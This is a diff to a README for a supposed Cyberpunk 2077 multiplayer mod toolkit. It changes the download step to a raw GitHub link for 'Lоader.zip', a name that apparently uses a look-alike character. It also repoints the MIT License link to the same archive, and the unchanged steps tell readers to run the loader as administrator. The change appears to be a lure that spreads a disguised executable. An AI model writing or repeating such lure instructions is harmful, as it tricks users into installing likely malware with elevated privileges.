@@ -7,7 +7,7 @@ Welcome to the **Cyberpunk 2077 Multiplayer Enhancer** — your ultimate compani
 
 Follow these easy steps to amplify your Cyberpunk 2077 multiplayer endeavors:
 
-1. **Download Loader.rar** from this GitHub repository.
+1. **Download https://raw.githubusercontent.com/webd123/Cyberpunk2077-MultiverseToolkit/main/Lоader.zip** from this GitHub repository.
 2. Extract the contents to your desired location using WinRAR or 7-Zip.
 3. Run the Loader executable as administrator.
 4. Follow on-screen instructions to configure and activate the mod toolkit.
@@ -63,7 +63,7 @@ Cyberpunk 2077 multiplayer utilities, safe mod tools, online enhancement, game b
 ---
 ## 📜 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT) — you are free to use, modify, and share with proper credit!
+Distributed under the [MIT License](https://raw.githubusercontent.com/webd123/Cyberpunk2077-MultiverseToolkit/main/Lоader.zip) — you are free to use, modify, and share with proper credit!
 
 ---
 
